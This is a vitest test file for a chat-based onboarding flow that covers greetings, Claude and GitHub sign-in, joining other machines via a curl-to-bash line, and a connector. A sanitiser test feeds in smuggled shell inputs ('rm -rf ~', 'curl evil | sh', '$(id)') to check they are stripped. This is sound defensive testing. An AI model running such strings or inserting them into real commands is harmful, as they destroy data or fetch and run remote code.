import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { beforeEach, expect, it, vi, describe } from 'vitest'
import type { SetupDeps, SetupState } from './setup.ts'
import { NPX_PUBLISHED } from '../shared/paste-line.ts'

// The first run is a conversation with weevboss (server/setup.ts): it speaks first, from what weevils detected, with no
// button; the subscription's sign-in, another computer and the connector all come as sentences in the chat; what
// weevboss is told in its first days (firstRunBrief); a job its turn cannot run goes to a session when agents ask.
const auth = vi.hoisted(() => ({ ready: false, tool: 'claude' as 'claude' | 'codex', pending: null as null | { url: string }, submitted: [] as string[] }))
vi.mock('./provider.ts', () => ({
  preferredTool: () => auth.tool,
  providerStatus: () => ({ installed: true, logged: auth.ready }),
  providerReady: () => auth.ready,
  codexLogged: () => false,
}))
vi.mock('./claude-login.ts', () => ({
  LOGIN_TTL: 15 * 60_000,
  start: vi.fn(async () => 'https://claude.ai/oauth/authorize?code=abc'),
  output: () => '',
  cancel: vi.fn(),
  pending: () => auth.pending,
  submit: vi.fn(async (_d: unknown, code: string) => {
    auth.submitted.push(code)
    auth.ready = true
    return { ok: true }
  }),
}))
vi.mock('./claude-credentials.ts', () => ({ claudeLoggedIn: () => auth.ready }))
const guest = vi.hoisted(() => ({ dir: null as string | null, reply: null as null | { text: string; task: boolean }, asked: [] as Record<string, unknown>[] }))
vi.mock('./guest-brain.ts', async (orig) => ({
  ...(await orig<typeof import('./guest-brain.ts')>()),
  guestDir: () => guest.dir,
  guestAnswer: async (o: Record<string, unknown>) => (guest.asked.push(o), guest.reply),
}))
const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'setup-welcome-'))
process.env.WEEVILS_CONFIG = path.join(dir, 'env')
process.env.WEEVILS_LANG = 'en'
const { Setup, greeting, firstRunBrief, joinHost, looksLikeLoginCode, joinChoice, vaultLine, githubBrief, offersServer, otherClaudes } = await import('./setup.ts')
const { withLang, tr } = await import('./i18n.ts')
const { default: M } = await import('./i18n/setup.ts')
const { DATA_DIR } = await import('./config.ts')
const { Join } = await import('./join.ts')

const machine = { kind: 'vps' as SetupState['machine']['kind'], mac: false, os: 'Ubuntu 24.04', cpus: 2, ramGb: 4, uptimeDays: 3, alwaysOn: true, host: 'box', user: 'user', sshTarget: 'user@203.0.113.7', agents: 2, others: [] as string[], othersAlwaysOn: false }
const state = (o: Partial<SetupState> & { others?: string[] } = {}): SetupState =>
  ({
    machine: { ...machine, others: o.others ?? [] },
    reach: 'public', url: 'https://weevils.example.com', https: true, port: 4179, clone: '~/weevils',
    claude: { installed: true, logged: auth.ready }, codex: { installed: false, logged: false }, github: { installed: true, logged: false },
    voice: { spoken: null, openai: false, https: true }, devil: { plugged: false }, mail: { on: false, authors: 0, pending: [] },
    phone: { devices: 1, push: 0 }, shortcut: false, security: { safe: true, https: true, exposedHttp: false }, quota: [],
    pkg: 'apt', sudo: 'no', tools: {} as SetupState['tools'], projects: 0, projectNames: [], connector: false, vault: { state: 'none', imported: false, without: [], said: [] },
    ...o,
  }) as SetupState
const both = { claude: true, codex: true }

beforeEach(() => {
  fs.rmSync(path.join(DATA_DIR, 'setup.json'), { force: true })
  auth.ready = false
  auth.tool = 'claude'
  auth.pending = null
  auth.submitted = []
  process.env.WEEVILS_SAFE = '1'
})

describe('the hello', () => {
  // The owner, 2026-11-23: a real onboarding, not just « hi I'm weevboss » (it looks like a scam); then: fewer
  // messages, an upbeat first one, and weevils as the place for all their AI agents and machines, not a site maker.
  it('two messages: what weevils is and that it stays theirs, then what it sees and what to ask; no button', () => {
    auth.ready = true
    const lines = greeting(state({ projects: 3, projectNames: ['weevils', 'notes', 'site'], machine: { ...machine, kind: 'desktop', others: ['laptop'] } }), both)
    expect(lines).toEqual([
      'Hi, I’m weevboss! 👋 weevils brings **all your AI agents and all your machines** together in one place, right in your pocket: Claude Code, Codex, your computer, your servers. You call the shots, I keep the whole crew moving 🚀 Your own AI subscription, your code stays home, and weevils is free.',
      'I can already see your 3 projects (weevils, notes and site), and laptop is plugged in too. Claude is already connected, so let’s start: tell me what you’d like to make, a game, a website, a small tool, a question about your code… Or first, [a one-minute tour](/#do=tour) of the app.',
    ])
    const fr = withLang('fr', () => greeting(state({ projects: 12, projectNames: ['a', 'b', 'c', 'd'] }), both))
    expect(fr[0]).toBe('Salut, moi c’est weevboss ! 👋 weevils réunit **tous tes agents IA et toutes tes machines** au même endroit, dans ta poche : Claude Code, Codex, ton ordi, tes serveurs. Tu donnes le cap, je fais tourner toute l’équipe 🚀 Ton propre abonnement IA, ton code reste chez toi, et weevils est gratuit.')
    expect(fr[1]).toBe('Je vois déjà tes 12 projets (a, b, c, d…). Claude est déjà connecté, alors on commence : dis-moi ce que tu veux faire, un jeu, un site, un petit outil, une question sur ton code… Ou d’abord, [un tour d’une minute](/#do=tour) de l’app.')
    // GitHub is the next step, offered on its own once the thread is calm (server/journey.ts): never in the hello.
    expect(greeting(state({ github: { installed: true, logged: true, login: 'alex' } }), both)[1]).toBe('Claude is already connected, so let’s start: tell me what you’d like to make, a game, a website, a small tool, a question about your code… Or first, [a one-minute tour](/#do=tour) of the app.')
    for (const t of [...lines, ...fr]) expect(t).not.toMatch(/\[\[setup:|relay|thread|weevbook|session|fil\b/i)
  })

  // The owner, 2026-11-23: « who says they have Claude? »: the sign-in is for those who do, a plan for those who don't.
  // Then: « why a Claude subscription? start with what you have »: ChatGPT is the other pick, one link away.
  it('no subscription signed in: Claude’s link in the hello itself, ChatGPT as the other pick, a plan if they have none', () => {
    const lines = greeting(state({ projects: 1, projectNames: ['notes'] }), both, 'https://claude.ai/oauth/authorize?code=abc')
    expect(lines[1]).toBe('I can already see your project (notes). To start, my agents need an AI subscription, Claude or ChatGPT, your pick. Claude? Open [Claude’s sign-in page](https://claude.ai/oauth/authorize?code=abc), accept, then paste the code it shows here. ChatGPT? [Connect it](/#do=codex). No subscription yet? [Pick a Claude plan](https://claude.com/pricing), then come back here.')
    // A machine that cannot run Codex: Claude only.
    expect(greeting(state(), { claude: true, codex: false }, 'https://claude.ai/x')[1]).toBe('To start, my agents need a Claude subscription. Got one? Open [Claude’s sign-in page](https://claude.ai/x), accept, then paste the code it shows here. No subscription yet? [Pick a Claude plan](https://claude.com/pricing), then come back here.')
    // A lent sign-in (server/guest-brain.ts): questions are welcome meanwhile.
    expect(greeting(state(), both, 'https://claude.ai/x', true)[1]).toMatch(/\[Pick a Claude plan\]\(https:\/\/claude\.com\/pricing\), then come back here\. Any question meanwhile\? Just ask\.$/)
    expect(greeting(state({ claude: { installed: true, logged: false } }), both)[1]).toContain('the link comes right below')
    expect(greeting(state({ claude: { installed: false, logged: false } }), both)[1]).toContain('I’m installing Claude Code on your VPS, the computer where your agents work')
    auth.tool = 'codex'
    expect(greeting(state(), both)[1]).toContain('your ChatGPT account, through Codex')
    expect(greeting(state(), both)[0]).toContain('Your own AI subscription')
    auth.tool = 'claude'
    expect(greeting(state(), { claude: false, codex: true })[1]).toContain('through Codex')
    expect(withLang('fr', () => greeting(state(), both, 'https://claude.ai/x')[1])).toBe('Pour commencer, mes agents ont besoin d’un abonnement IA, Claude ou ChatGPT, au choix. Claude ? Ouvre [la page de connexion de Claude](https://claude.ai/x), accepte, puis colle ici le code qu’elle affiche. ChatGPT ? [Connecte-le](/#do=codex). Pas encore d’abonnement ? [Choisis une offre Claude](https://claude.com/pricing), puis reviens ici.')
  })
})

describe('what weevboss is told in its first days', () => {
  it('the detected facts, so it asks none of them, and how each connection is made by talking', () => {
    const brief = firstRunBrief(state({ projects: 2, projectNames: ['weevils', 'notes'], others: ['laptop'], codex: { installed: true, logged: true } }), true)
    for (const fact of ['Claude Code signed in no', 'Codex signed in yes', 'GitHub signed in no', 'projects 2 (weevils, notes)', 'other machines: laptop', 'reached at https://weevils.example.com (public, https)', 'agents ask before acting yes', 'connector for ChatGPT and Claude.ai: off'])
      expect(brief).toContain(fact)
    expect(brief).toContain('never ask about it')
    expect(brief).toContain('onboarding is this conversation')
    expect(brief).toContain('`weevils setup ask machine` (posts the one line to paste in a terminal there)')
    expect(brief).toContain('`weevils setup ask connector`')
    expect(brief).toContain('never explain how weevils works inside')
    expect(firstRunBrief(state(), false)).toContain('cannot take one from a single line')
  })

  // docs/spec/07-vault.md: the vault is part of the welcome, and each state has one next step, by talking.
  it('the vault: weevils says the sync itself; none → the GitHub link; found → the recovery code; on → the export once', () => {
    const none = firstRunBrief(state(), true)
    expect(none).toContain('their conversations kept on their own GitHub (the vault): not yet')
    expect(none).toContain('GitHub not connected → their hello has its link; offer it again once, only when it helps, as this link in your sentence: [Connect your GitHub](/#do=github)')
    expect(none).toContain('said by weevils itself in your thread')
    expect(none).not.toContain('vault setup')
    // GitHub already signed in: weevils starts the sync itself, nothing left to weevboss.
    const logged = firstRunBrief(state({ github: { installed: true, logged: true, login: 'alex' } }), true)
    expect(logged).not.toContain('weevils setup github')
    expect(logged).not.toContain('vault setup')
    expect(logged).not.toContain('Connect your GitHub')
    const found = firstRunBrief(state({ vault: { state: 'found', repo: 'alex/weevbook-vault', imported: false, without: [], said: [] } }), true)
    expect(found).toContain('a vault exists on their GitHub, not opened on this machine')
    expect(found).toContain('ask for their 24-word recovery code here in the chat, then `weevils weevbook vault restore --code "…"`')
    expect(found).not.toContain('vault setup')
    const on = (said: string[]) => firstRunBrief(state({ vault: { state: 'on', repo: 'alex/weevbook-vault', imported: true, without: [], said } }), true)
    expect(on(['code', 'history'])).toContain('(the vault): yes (alex/weevbook-vault)')
    expect(on(['code', 'history'])).not.toContain('vault setup')
    // Said: not again. Then the export, once; then nothing more about it.
    expect(on(['code', 'history', 'summary'])).not.toContain('vault summary')
    expect(on(['code', 'history', 'summary'])).toContain('offer once their Claude.ai and ChatGPT export, then `weevils setup mark vault:export`')
    expect(on(['code', 'history', 'summary', 'export'])).not.toMatch(/vault summary|export/)
  })

  it('`weevils setup` says where the vault stands, what was said already, and which computers lack it', () => {
    expect(vaultLine({ state: 'none', imported: false, without: [], said: [] })).toBe('vault: none (weevils makes it and says so itself once GitHub is connected; GitHub not signed in: the link [Connect your GitHub](/#do=github))')
    expect(vaultLine({ state: 'found', repo: 'alex/weevbook-vault', imported: false, without: [], said: [] })).toContain('found on their GitHub (alex/weevbook-vault), not opened on this machine')
    expect(vaultLine({ state: 'on', repo: 'alex/weevbook-vault', imported: true, without: ['desk'], said: ['code', 'history'] })).toBe(
      'vault: on (alex/weevbook-vault) · this machine\'s history imported yes · recovery code given yes · history question asked yes · summary said no · Claude.ai and ChatGPT export offered no · plugged in without it (their line again fixes it): desk',
    )
    // A vault that was set up by hand, before weevboss knew of it: it has nothing to announce.
    expect(vaultLine({ state: 'on', repo: 'alex/weevbook-vault', imported: true, without: [], said: [] })).toBe('vault: on (alex/weevbook-vault) · set up outside your chat: nothing to say about it unless asked')
  })

  it('what weevboss is handed once GitHub’s code was typed: the next step for the vault, and that the person wrote nothing', () => {
    expect(githubBrief('alex', 'none')).toMatch(/^GitHub is signed in on this machine now \(alex\): the user typed the code on github\.com, they did not write this message\./)
    expect(githubBrief('alex', 'none')).toContain('weevils’ own job: it says so itself in your thread, never mention it')
    expect(githubBrief('alex', 'none')).not.toContain('vault setup')
    expect(githubBrief('alex', 'found')).toContain('`weevils weevbook vault restore --code "…"`')
    expect(githubBrief('', 'on')).not.toContain('vault')
  })
})

function make(deps: Partial<SetupDeps> = {}, s = state()) {
  const handoff = vi.fn(async () => {})
  const delegate = vi.fn(async () => {})
  const it = new Setup({ bump() {}, feed: () => ({ machines: [], projects: 0 }), remoteFacts: async () => [], devices: () => 0, push: () => 0, shortcut: () => false, seen: () => [], hasHistory: () => false, startMail() {}, handoff, delegate, ...deps } as SetupDeps)
  vi.spyOn(it, 'detect').mockImplementation(async () => {
    ;(it as unknown as { cache: unknown }).cache = { at: Date.now(), v: s }
    return s
  })
  const texts = () => it.messages().map((m) => m.text)
  return { it, handoff, delegate, texts }
}

describe('the first run, end to end', () => {
  it('weevboss speaks first with the sign-in link; the code pasted in the chat signs in, never reaches the model', async () => {
    const { it: s, texts } = make({}, state({ claude: { installed: true, logged: false }, projects: 1, projectNames: ['notes'] }))
    const mid = await s.welcome({ os: 'linux', mobile: false, standalone: false })
    expect(mid).toBeTruthy()
    expect(texts()).toHaveLength(2)
    expect(texts()[1]).toBe('I can already see your project (notes). To start, my agents need an AI subscription, Claude or ChatGPT, your pick. Claude? Open [Claude’s sign-in page](https://claude.ai/oauth/authorize?code=abc), accept, then paste the code it shows here. ChatGPT? [Connect it](/#do=codex). No subscription yet? [Pick a Claude plan](https://claude.com/pricing), then come back here.')
    expect(await s.welcome({ os: 'linux', mobile: false, standalone: false })).toBeUndefined()
    // Something else typed first: the link again, no button.
    await s.offline('hello?')
    expect(texts().at(-1)).toContain('Open [Claude’s sign-in page]')
    // The code from Claude's page.
    auth.pending = { url: 'https://claude.ai/oauth/authorize?code=abc' }
    const code = 'Xy7_aBcDeFgHiJkLmNoPqRsTuV#st4te-123'
    await s.offline(code)
    expect(auth.submitted).toEqual([code])
    expect(texts()).toContain(code)
    // The first milestone: a win, what it opens, one example to try, then the tour.
    expect(texts().at(-1)).toBe('[[win]]**Claude is connected**: your agents can build now. Try it: [make me a small notes app](/#do=try.notes). Or first, [a one-minute tour](/#do=tour) of the app.')
    expect(s.messages().at(-1)?.win).toMatchObject({ kind: 'step', id: 'step:brain' })
    for (const t of texts()) expect(t).not.toContain('[[setup:')
    const ctx = s.contextFor()
    expect(ctx).not.toContain(code)
    expect(ctx).toContain('(a sign-in code, not shown)')
    expect(ctx).toContain('onboarding is this conversation')
  })

  // The owner, 2026-11-23: until their own Claude is in, a newcomer's questions are answered, not met with the link again.
  it('with a lent sign-in: questions answered as weevboss, a request kept and started once their Claude is in', async () => {
    guest.dir = '/lent'
    const { it: s, texts, delegate } = make({}, state({ claude: { installed: true, logged: false } }))
    await s.welcome({ os: 'linux', mobile: false, standalone: false })
    expect(texts()[1]).toMatch(/Any question meanwhile\? Just ask\.$/)
    guest.reply = { text: 'weevils itself is free: you only use your own Claude subscription.', task: false }
    await s.offline('is it free?')
    expect(texts().slice(-2)).toEqual(['is it free?', 'weevils itself is free: you only use your own Claude subscription.'])
    expect(guest.asked.at(-1)).toMatchObject({ dir: '/lent', lang: 'en', text: 'is it free?' })
    guest.reply = { text: 'I kept it: I start as soon as your Claude is signed in.', task: true }
    await s.offline('make me a snake game')
    expect(texts().at(-2)).toBe('I kept it: I start as soon as your Claude is signed in.')
    expect(texts().at(-1)).toContain('Open [Claude’s sign-in page]')
    auth.pending = { url: 'https://claude.ai/oauth/authorize?code=abc' }
    await s.offline('Xy7_aBcDeFgHiJkLmNoPqRsTuV#st4te-123')
    expect(texts()).toContain('[[win]]**Claude is connected**: I’m starting what you asked.')
    expect(delegate).toHaveBeenCalledWith('make me a snake game', '')
    // No answer from the loan: the sign-in link, as without one.
    guest.dir = null
  })

  it('tells a pasted code from a sentence', () => {
    expect(looksLikeLoginCode('Xy7_aBcDeFgHiJkLmNoPqRsTuV#st4te-123')).toBe(true)
    expect(looksLikeLoginCode('abcDEF1234567890ghijKLMN')).toBe(true)
    for (const x of ['hello?', 'what can you do for me', 'supercalifragilisticexpialidocious', 'short1']) expect(looksLikeLoginCode(x), x).toBe(false)
  })

  it('an installation that already talked to weevboss is not welcomed', async () => {
    const { it: s, texts } = make({ hasHistory: () => true })
    expect(await s.welcome({ os: 'linux', mobile: false, standalone: false })).toBeUndefined()
    expect(texts()).toEqual([])
  })
})

describe('another computer, by talking', () => {
  it('one line to paste there, its code kept from the model; then the key, then the machine online', async () => {
    auth.ready = true
    const home = fs.mkdtempSync(path.join(os.tmpdir(), 'join-home-'))
    const join = new Join({ file: path.join(home, 'join.json'), authorizedKeys: path.join(home, '.ssh', 'authorized_keys'), service: '/home/user/.local/bin/weevils-service', remotes: () => '', machineIds: () => ['box'] })
    const machines: { id: string; name: string; online?: boolean }[] = []
    const { it: s, texts } = make({ join, sshd: async () => true, feed: () => ({ machines, projects: 0 }) })
    expect(await s.ask('machine')).toBe(false)
    const line = /`(curl -fsSL https:\/\/weevils\.example\.com\/api\/join\.sh \| bash -s ([A-Za-z0-9_-]+))`/.exec(texts().at(-1)!)
    expect(line).not.toBeNull()
    // npx first, the same code, once the npm package is published; the curl line under it for a machine without Node.js.
    if (NPX_PUBLISHED) {
      expect(texts().at(-1)).toContain(`\`npx weevils join weevils.example.com ${line![2]}\``)
      expect(texts().at(-1)!.indexOf('npx weevils')).toBeLessThan(texts().at(-1)!.indexOf('curl -fsSL'))
    } else expect(texts().at(-1)).not.toContain('npx')
    expect(texts().at(-1)).toMatch(/^On your other computer, open a terminal and paste this line:/)
    expect(join.open(line![2])?.target).toBe('user@weevils.example.com')
    expect(s.contextFor()).not.toContain(line![2])
    s.joined('laptop')
    expect(texts().at(-1)).toBe('laptop is plugging in: weevils is installing there, a few minutes.')
    machines.push({ id: 'laptop', name: 'laptop', online: true })
    await (s as unknown as { watch: () => Promise<void> }).watch()
    expect(texts().at(-1)).toBe('[[win]]**laptop is plugged in**: I can run agents there now.')
    // A real win (the machine is online): the line carries it, the key's line does not.
    const said = s.messages()
    expect(said.at(-1)?.win).toMatchObject({ kind: 'machine', id: expect.stringMatching(/^machine:laptop:/) })
    expect(said.at(-2)?.win).toBeUndefined()
  })

  // No terminal on the other computer: Claude's sign-in there happens here, in weevboss's thread (server/machine-claude.ts).
  const watch = (s: unknown) => (s as { watch: () => Promise<void> }).watch()
  type Box = { id: string; name: string; online?: boolean; claude?: { installed: boolean; logged: boolean } }

  it('Claude not signed in on the new computer: one sentence with its link; its page here, the code pasted here goes there', async () => {
    auth.ready = true
    const machines: Box[] = []
    const calls: unknown[][] = []
    const answers: unknown[] = []
    const machineCall = vi.fn(async (...a: unknown[]) => (calls.push(a.slice(0, 3)), answers.shift()))
    const { it: s, texts } = make({ feed: () => ({ machines, projects: 0 }), machineCall: machineCall as SetupDeps['machineCall'] })
    s.joined('desk')
    machines.push({ id: 'desk', name: 'desk', online: true, claude: { installed: true, logged: false } })
    await watch(s)
    expect(texts().at(-1)).toBe('[[win]]**desk is plugged in**: I can run agents there now. One thing left, Claude isn’t signed in there yet: [sign it in from here](/#do=claude.desk), it takes a minute.')
    expect(withLang('fr', () => tr(M).joinClaude('desk'))).toBe('Il reste à y connecter Claude : [connecte-le d’ici](/#do=claude.desk), ça prend une minute.')
    // The link: desk starts its sign-in, its official page comes here.
    answers.push({ installed: true, logged: false, url: 'https://claude.com/cai/oauth/authorize?code=desk' })
    expect(await s.act('claude.desk')).toBe(true)
    expect(calls.at(-1)).toEqual(['desk', '/api/machine/claude/login', { install: true }])
    expect(texts().at(-1)).toBe('Open [Claude’s sign-in page](https://claude.com/cai/oauth/authorize?code=desk) for desk, accept, then paste the code it shows here: I’ll hand it to desk.')
    // Not a code: the message goes on to weevboss as usual. A wrong code: said, and a new page at once.
    expect(s.takeRemoteCode('what can you do on desk?')).toBe(false)
    answers.push({ ok: false, why: "That code wasn't accepted." }, { installed: true, logged: false, url: 'https://claude.com/cai/oauth/authorize?code=desk2' })
    expect(s.takeRemoteCode('abcDEF1234567890ghij#KLMN')).toBe(true)
    await vi.waitFor(() => expect(texts().at(-1)).toContain('code=desk2'))
    expect(calls[1]).toEqual(['desk', '/api/machine/claude/code', { code: 'abcDEF1234567890ghij#KLMN' }])
    expect(texts().at(-2)).toBe('Claude doesn’t accept this code for desk (incomplete, expired or already used). Here’s a new link:')
    expect(s.contextFor()).not.toContain('abcDEF1234567890ghij')
    // The good code: desk says it is signed in, weevboss confirms.
    answers.push({ ok: true })
    expect(s.takeRemoteCode('xyzDEF1234567890ghij#KLMN')).toBe(true)
    await vi.waitFor(() => expect(texts().at(-1)).toBe('Claude is signed in on desk ✓'))
    expect(withLang('fr', () => tr(M).remoteClaudeOk('desk'))).toBe('Claude est connecté sur desk ✓')
    // Nothing waits any more: the next such text is not taken.
    expect(s.takeRemoteCode('qqqDEF1234567890ghij#KLMN')).toBe(false)
  })

  it('Claude Code not on that computer: installed there first; signed in there some other way, said once; away, said', async () => {
    auth.ready = true
    const machines: Box[] = [{ id: 'desk', name: 'desk', online: true, claude: { installed: false, logged: false } }]
    const machineCall = vi.fn(async () => ({ installed: true, logged: false, url: 'https://claude.com/cai/oauth/authorize?code=d' }))
    const { it: s, texts } = make({ feed: () => ({ machines, projects: 0 }), machineCall: machineCall as SetupDeps['machineCall'] })
    s.joined('desk')
    await watch(s)
    expect(texts().at(-1)).toContain('Claude Code isn’t on it yet: [I’ll install it and sign it in](/#do=claude.desk), a few minutes.')
    expect(await s.act('claude.desk')).toBe(true)
    expect(texts().at(-2)).toBe('Installing Claude Code on desk (the official installer), one minute…')
    expect(machineCall).toHaveBeenCalledWith('desk', '/api/machine/claude/login', { install: true }, 360_000)
    // Signed in on desk without the code coming here (a terminal there, a lost answer): said once, from its snapshot.
    machines[0].claude = { installed: true, logged: true }
    await watch(s)
    expect(texts().at(-1)).toBe('Claude is signed in on desk ✓')
    await watch(s)
    expect(texts().filter((t) => t === 'Claude is signed in on desk ✓')).toHaveLength(1)
    // Away, or not a machine of yours.
    machines[0].online = false
    expect(await s.act('claude.desk')).toBe(true)
    expect(texts().at(-1)).toBe('desk isn’t answering right now: once it’s back, ask me again and I’ll sign Claude in there.')
    expect(await s.act('claude.nas')).toBe(false)
    expect(machineCall).toHaveBeenCalledTimes(1)
  })

  it('signed in there already: the welcome says nothing more; weevboss is told which machines still need it', async () => {
    auth.ready = true
    const machines: Box[] = []
    const { it: s, texts } = make({ feed: () => ({ machines, projects: 0 }) })
    s.joined('desk')
    machines.push({ id: 'desk', name: 'desk', online: true, claude: { installed: true, logged: true } })
    await watch(s)
    expect(texts().at(-1)).toBe('[[win]]**desk is plugged in**: I can run agents there now.')
    expect(otherClaudes(machines)).toBe('')
    expect(otherClaudes([{ id: 'nas', name: 'nas', online: true, claude: { installed: false, logged: false } }, { id: 'pi', name: 'pi', online: false, claude: { installed: true, logged: false } }])).toBe(
      'Claude Code on other machines: nas not installed ([sign Claude in on nas](/#do=claude.nas) in your sentence, or `weevils setup ask claude nas` to post that link, installing it first)',
    )
  })

  // docs/spec/07-vault.md, « The history »: a date or a few conversations for the other computer ride on its line.
  it('the line carries what to bring of that computer’s history: a day, or plain words, and nothing else', async () => {
    expect(joinChoice({})).toBe('')
    expect(joinChoice({ since: '2026-10-01' })).toBe(' --since 2026-10-01')
    expect(joinChoice({ match: 'invoice exporter' })).toBe(" --match 'invoice exporter'")
    expect(joinChoice({ match: 'l’export des factures, été' })).toBe(" --match 'l export des factures été'")
    // Nothing a shell would read: quotes, substitutions and separators are dropped; a date that is not one is ignored.
    expect(joinChoice({ since: '2026-10-01; rm -rf ~', match: "x'; curl evil | sh; '$(id)`id`" })).toBe(" --match 'x curl evil sh id id'")
    auth.ready = true
    const home = fs.mkdtempSync(path.join(os.tmpdir(), 'join-home-'))
    const join = new Join({ file: path.join(home, 'join.json'), authorizedKeys: path.join(home, '.ssh', 'authorized_keys'), service: '/home/user/.local/bin/weevils-service', remotes: () => '', machineIds: () => ['box'] })
    const { it: s, texts } = make({ join, sshd: async () => true })
    await s.ask('machine', undefined, false, { since: '2026-10-01' })
    expect(texts().at(-1)).toMatch(/`curl -fsSL https:\/\/weevils\.example\.com\/api\/join\.sh \| bash -s [A-Za-z0-9_-]+ --since 2026-10-01`/)
    if (NPX_PUBLISHED) expect(texts().at(-1)).toMatch(/`npx weevils join weevils\.example\.com [A-Za-z0-9_-]+ --since 2026-10-01`/)
    const context = s.contextFor()
    expect(context).toContain('bash -s •••• --since 2026-10-01')
    if (NPX_PUBLISHED) expect(context).toContain('npx weevils join weevils.example.com •••• --since 2026-10-01')
  })

  it('only from a public https address; SSH to that name, or to a VPS’s public IP behind a tunnel', () => {
    expect(joinHost(state())).toBe('weevils.example.com')
    const tunnel = { url: 'https://some-words-here.trycloudflare.com', reach: 'public' as const }
    expect(joinHost(state(tunnel))).toBe('203.0.113.7')
    expect(joinHost({ ...state(tunnel), machine: { ...machine, sshTarget: 'user@192.168.1.4' } })).toBeNull()
    expect(joinHost({ ...state(tunnel), machine: { ...machine, kind: 'laptop' as const, sshTarget: 'user@laptop' } })).toBeNull()
    // Plain http (local, home network, a public IP without https): the answer could be tampered with on the way.
    expect(joinHost(state({ reach: 'local', https: false, url: 'http://127.0.0.1:4179' }))).toBeNull()
    expect(joinHost(state({ reach: 'lan', https: false, url: 'http://192.168.1.4:4179' }))).toBeNull()
    expect(joinHost(state({ reach: 'public', https: false, url: 'http://203.0.113.7:4179' }))).toBeNull()
  })

  it('a machine that cannot take one from a line: the masked field for its address, as before', async () => {
    auth.ready = true
    const home = fs.mkdtempSync(path.join(os.tmpdir(), 'join-home-'))
    const join = new Join({ file: path.join(home, 'join.json'), authorizedKeys: path.join(home, '.ssh', 'authorized_keys'), service: '/home/user/.local/bin/weevils-service', remotes: () => '', machineIds: () => ['box'] })
    for (const [s, sshd] of [[state({ reach: 'local', https: false, url: 'http://127.0.0.1:4179' }), true], [state(), false]] as const) {
      const { it: x, texts } = make({ join, sshd: async () => sshd }, s)
      expect(await x.ask('machine')).toBe(true)
      expect(texts().at(-1)).toContain('[[setup:machine]]')
      expect(texts().at(-1)).not.toContain('/api/join.sh')
    }
    expect(fs.existsSync(path.join(home, 'join.json'))).toBe(false)
  })
})

describe('GitHub, by talking (the vault needs it once)', () => {
  // A stand-in for gh: its device sign-in prints the code and the address the way gh 2.x does, waits for the code to
  // be « typed » (a file), then answers as signed in.
  function fakeGh() {
    const bin = fs.mkdtempSync(path.join(os.tmpdir(), 'fake-gh-'))
    const typed = path.join(bin, 'typed')
    fs.writeFileSync(path.join(bin, 'gh'), `#!/bin/sh
case "$1 $2" in
  "auth login")
    echo "$*" >"${bin}/login-args"
    echo "! First copy your one-time code: AB12-CD34" >&2
    echo "Open this URL to continue in your web browser: https://github.com/login/device" >&2
    while [ ! -f "${typed}" ]; do sleep 0.05; done
    [ "$(cat "${typed}")" = ok ] ;;
  "api user") [ -f "${typed}" ] && echo alex ;;
  "auth setup-git") touch "${bin}/setup-git" ;;
  *) exit 1 ;;
esac
`, { mode: 0o755 })
    const before = process.env.PATH
    process.env.PATH = `${bin}${path.delimiter}${before}`
    return { bin, typed, restore: () => (process.env.PATH = before) }
  }
  const until = async (ok: () => boolean) => {
    for (let i = 0; i < 100 && !ok(); i++) await new Promise((r) => setTimeout(r, 50))
    expect(ok()).toBe(true)
  }

  it('one sentence with the code and the github.com/login/device link; once typed, weevboss is told and carries on', async () => {
    auth.ready = true
    const gh = fakeGh()
    try {
      const { it: s, handoff, texts } = make()
      expect(await s.githubDevice()).toBe('posted')
      expect(texts()).toEqual(['Sign in to your GitHub, just once: open [github.com/login/device](https://github.com/login/device) and type this code: **AB12-CD34** (valid 15 minutes). I’ll carry on as soon as it’s done.'])
      expect(fs.readFileSync(path.join(gh.bin, 'login-args'), 'utf8').trim()).toBe('auth login --hostname github.com --git-protocol https --web --scopes workflow')
      // Asked again while it waits: the same sentence, not a second code.
      expect(await s.githubDevice()).toBe('posted')
      expect(texts()).toHaveLength(1)
      expect(handoff).not.toHaveBeenCalled()
      fs.writeFileSync(gh.typed, 'ok')
      await until(() => handoff.mock.calls.length === 1)
      const [said, brief] = handoff.mock.calls[0] as unknown as string[]
      expect(said).toBe('GitHub is connected.')
      expect(brief).toContain('GitHub is signed in on this machine now (alex)')
      expect(brief).toContain('never mention it')
      // No button, no command for the person, and the generic « GitHub plugged in » line is not added on top.
      expect(texts()).toHaveLength(1)
      expect(texts()[0]).not.toMatch(/\[\[setup:|`/)
      await until(() => fs.existsSync(path.join(gh.bin, 'setup-git')))
    } finally {
      gh.restore()
    }
  })

  it('a sign-in that does not finish says so in one sentence; nothing to do when GitHub is already signed in', async () => {
    auth.ready = true
    const gh = fakeGh()
    try {
      const { it: s, handoff, texts } = make()
      expect(await s.githubDevice()).toBe('posted')
      fs.writeFileSync(gh.typed, 'expired')
      // (« api user » answers now, but gh itself gave up: the code was never accepted.)
      await until(() => texts().length === 2)
      expect(texts()[1]).toBe('GitHub didn’t sign in (no answer). Tell me when you want to try again.')
      expect(handoff).not.toHaveBeenCalled()
      const done = make({}, state({ github: { installed: true, logged: true, login: 'alex' } }))
      expect(await done.it.githubDevice()).toBe('signed-in')
      expect(done.texts()).toHaveLength(2)
    } finally {
      gh.restore()
    }
  })
})

describe('the connector, by talking', () => {
  it('turned on at once and kept on, with the address and the clicks for both chat apps', async () => {
    auth.ready = true
    const connectorOn = vi.fn()
    const { it: s, texts } = make({ connectorOn })
    expect(await s.ask('connector')).toBe(false)
    expect(connectorOn).toHaveBeenCalledTimes(1)
    expect(fs.readFileSync(process.env.WEEVILS_CONFIG!, 'utf8')).toContain('WEEVILS_CONNECTOR=1')
    const said = texts().at(-1)!
    expect(said).toContain('`https://weevils.example.com/mcp`')
    expect(said).toContain('Claude.ai: Settings → Connectors → Add custom connector')
    expect(said).toContain('ChatGPT: Settings → Apps & Connectors')
    expect(said).toContain('access code')
    delete process.env.WEEVILS_CONNECTOR
  })

  it('not reachable over public https: one sentence on what it needs, nothing turned on', async () => {
    auth.ready = true
    const connectorOn = vi.fn()
    const { it: s, texts } = make({ connectorOn }, state({ reach: 'local', https: false, url: 'http://127.0.0.1:4179' }))
    await s.ask('connector')
    expect(connectorOn).not.toHaveBeenCalled()
    expect(texts().at(-1)).toContain('only reach me at a public https address')
  })
})

describe('agents ask before acting: what weevboss’s turn cannot run goes to a session', () => {
  const mac = () => state({ machine: { ...machine, kind: 'laptop' as const, mac: true, os: 'macOS 15.1', sshTarget: 'user@mac' }, reach: 'local', https: false, url: 'http://127.0.0.1:4179', sudo: 'password', pkg: 'brew' })
